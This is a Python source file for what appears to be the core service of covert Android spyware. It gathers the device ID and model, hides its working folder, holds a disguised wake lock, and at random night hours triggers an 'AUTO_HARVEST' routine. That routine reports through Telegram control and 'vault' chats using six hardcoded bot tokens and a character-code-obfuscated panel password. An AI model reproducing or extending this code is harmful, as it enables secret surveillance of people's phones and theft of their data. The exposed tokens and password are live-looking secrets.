# -*- coding: utf-8 -*-
import os, time, json, random, threading, logging, gc, traceback
from datetime import datetime, timedelta

# إعداد المسارات
P = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(P):
    os.makedirs(P)

logging.basicConfig(
    filename=os.path.join(P, "m.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s [%(levelname)s] %(message)s'
)

try:
    from jnius import autoclass
    JNI = True
except:
    JNI = False

class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")

        self.rn = True
        self.wl = None
        self.did = None
        self.dmd = None
        self.last_mid = 0

        self.cb_h = None
        self.ui = None

        self.bots = []
        self.ctrl = -1003365166986
        self.vlt = -1003787520015

        self.auth_active = False
        self._lc()
        self._di()
        self._setup()

    def _setup(self):
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f:
                f.write("")
        except:
            pass

    def _lc(self):
        d = {"mz": 45, "hth": 20, "wl": True, "iv": 120, "video_res": "360"}
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f:
                    d.update(json.load(f))
            except:
                pass
        self.cfg = d

    def _get_ctx(self):
        if not JNI:
            return None
        try:
            return autoclass('org.kivy.android.PythonActivity').mActivity
        except:
            return None

    def _di(self):
        if JNI:
            try:
                ctx = self._get_ctx()
                B = autoclass('android.os.Build')
                S = autoclass('android.provider.Settings$Secure')
                self.did = S.getString(ctx.getContentResolver(), S.ANDROID_ID)
                self.dmd = f"{B.MANUFACTURER} {B.MODEL}"
            except:
                self.did = f"D{random.randint(1000, 9999)}"
                self.dmd = "Droid_Device"
        else:
            self.did, self.dmd = "PC_Dev", "Linux_System"

    def _is_wifi(self):
        if not JNI:
            return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1
        except:
            return False

    def _bat(self):
        if not JNI:
            return 100, True
        try:
            ctx = self._get_ctx()
            filt = autoclass('android.content.IntentFilter')("android.intent.action.BATTERY_CHANGED")
            it = ctx.registerReceiver(None, filt)
            l = it.getIntExtra("level", -1)
            s = it.getIntExtra("scale", -1)
            st = it.getIntExtra("status", -1)
            return int((l / s) * 100), st in (2, 5)
        except:
            return 50, False

    def _nht(self):
        n = datetime.now()
        t = n.replace(hour=random.randint(1, 4), minute=random.randint(0, 59))
        if t <= n:
            t += timedelta(days=1)
        return t

    def _harvest(self):
        if not self._is_wifi():
            return
        p, c = self._bat()
        if p < self.cfg.get('hth', 20) and not c:
            return
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    if datetime.now() < datetime.fromisoformat(f.read().strip()):
                        return
            except:
                pass
        if self.cb_h:
            try:
                self.cb_h("AUTO_HARVEST", self.ctrl, None)
                with open(self.wt, 'w') as f:
                    f.write(self._nht().isoformat())
                with open(self.lh, 'w') as f:
                    f.write(datetime.now().isoformat())
            except Exception as e:
                logging.error(f"Harvest Error: {e}")
        gc.collect()

    def _wake(self):
        if self.cfg.get('wl') and JNI:
            try:
                ctx = self._get_ctx()
                pm = ctx.getSystemService("power")
                self.wl = pm.newWakeLock(1, "com.sys.auth:sync_lock")
                self.wl.acquire()
            except:
                pass

    def _loop(self):
        self._wake()
        while self.rn:
            try:
                self._harvest()
            except Exception as e:
                logging.error(f"Loop Error: {e}")
            time.sleep(self.cfg.get('iv', 120))

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.rn = False
        try:
            if self.wl and self.wl.isHeld():
                self.wl.release()
        except:
            pass


# ========== ✅ كلمة السر الموحدة: Zaen123@123@ ==========
def _pw():
    """ترجع كلمة السر المستخدمة في تسجيل الدخول إلى لوحة تحكم تلغرام"""
    # القيم العددية: Z a e n 1 2 3 @ 1 2 3 @
    return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])


if __name__ == '__main__':
    m = M()
    m.bots = [
        "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
        "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
        "8369506331:AAFbMuU5NsVPWP9y977xG_lLaG1-pdGBs-Q",
        "8731591344:AAE2akQtyBPLNZbzhxkjxYDgQ4noiH_keYo",
        "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
        "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
    ]
    try:
        import telegram_ui, commands
        m.ui = telegram_ui.T(m)
        m.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, m.ui, m, cid, cbq)
        m.ui.start()
    except Exception as e:
        logging.error(f"Service Core Link Error: {traceback.format_exc()}")
    m.start()
    while True:
        time.sleep(3600)
